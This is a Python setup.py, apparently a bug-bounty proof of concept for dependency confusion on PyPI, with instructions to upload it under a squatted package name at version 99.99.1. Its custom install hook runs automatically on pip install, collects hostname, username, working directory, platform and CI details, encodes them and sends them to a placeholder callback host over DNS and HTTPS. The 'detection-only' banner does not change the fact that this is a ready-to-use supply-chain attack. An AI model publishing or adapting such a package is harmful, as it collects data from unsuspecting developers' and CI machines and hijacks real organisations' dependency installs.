"""
setup.py — RASTTHACK Dependency Confusion PoC (PyPI)

DETECTION-ONLY payload — DNS + HTTP callbacks, no destructive actions.

SETUP:
  1. Replace CALLBACK_HOST with your interactsh or Burp Collaborator URL
  2. Replace the `name` field with the squattable package name
  3. python -m build && twine upload dist/*
"""

from setuptools import setup
from setuptools.command.install import install
import os
import socket
import platform
import base64
import json
import urllib.request
import urllib.parse

# ─── CONFIGURE THESE ──────────────────────────────────────────────────────────
CALLBACK_HOST = "REPLACE-WITH-YOUR-INTERACTSH-URL.oast.fun"
YOUR_ALIAS    = "RASTTHACK"
# ─────────────────────────────────────────────────────────────────────────────


class PostInstallCommand(install):
    """Custom install command with detection-only callback."""

    def run(self):
        install.run(self)
        self._send_callback()

    def _send_callback(self):
        try:
            info = {
                "pkg":      "REPLACE-WITH-TARGET-PACKAGE-NAME",
                "host":     socket.gethostname(),
                "platform": platform.system(),
                "arch":     platform.machine(),
                "user":     os.getenv("USER") or os.getenv("USERNAME") or "unknown",
                "cwd":      os.getcwd(),
                "python":   platform.python_version(),
                "ci": bool(
                    os.getenv("CI")             or
                    os.getenv("GITHUB_ACTIONS") or
                    os.getenv("JENKINS_URL")    or
                    os.getenv("GITLAB_CI")      or
                    os.getenv("CIRCLECI")       or
                    os.getenv("TRAVIS")
                ),
                "ci_name": (
                    "github-actions" if os.getenv("GITHUB_ACTIONS") else
                    "jenkins"        if os.getenv("JENKINS_URL")    else
                    "gitlab-ci"      if os.getenv("GITLAB_CI")      else
                    "circleci"       if os.getenv("CIRCLECI")        else
                    "travis"         if os.getenv("TRAVIS")          else "none"
                )
            }

            payload = base64.b64encode(json.dumps(info).encode()).decode()

            # DNS callback
            sub = f"pip-{info['host']}-{YOUR_ALIAS}"
            sub = "".join(c if c.isalnum() or c == "-" else "-" for c in sub).lower()[:40]
            try:
                socket.gethostbyname(f"{sub}.{CALLBACK_HOST}")
            except Exception:
                pass

            # HTTP callback
            params = urllib.parse.urlencode({
                "src":  "pypi",
                "host": info["host"],
                "ci":   str(info["ci"]),
                "data": payload
            })
            url = f"https://{CALLBACK_HOST}/?{params}"
            try:
                urllib.request.urlopen(url, timeout=5)
            except Exception:
                pass

            print("")
            print("[SECURITY RESEARCH] Dependency confusion detection payload")
            print(f"[SECURITY RESEARCH] Researcher: {YOUR_ALIAS}")
            print("[SECURITY RESEARCH] This is a bug bounty detection-only payload.")
            print("[SECURITY RESEARCH] No destructive actions were taken.")
            print("")

        except Exception:
            pass


setup(
    name="REPLACE-WITH-TARGET-PACKAGE-NAME",
    version="99.99.1",
    description="Security research — dependency confusion bug bounty payload",
    long_description="This package is a security research detection-only payload.",
    author=YOUR_ALIAS,
    python_requires=">=3.6",
    cmdclass={"install": PostInstallCommand},
    classifiers=[
        "Development Status :: 1 - Planning",
        "Intended Audience :: Developers",
    ],
)
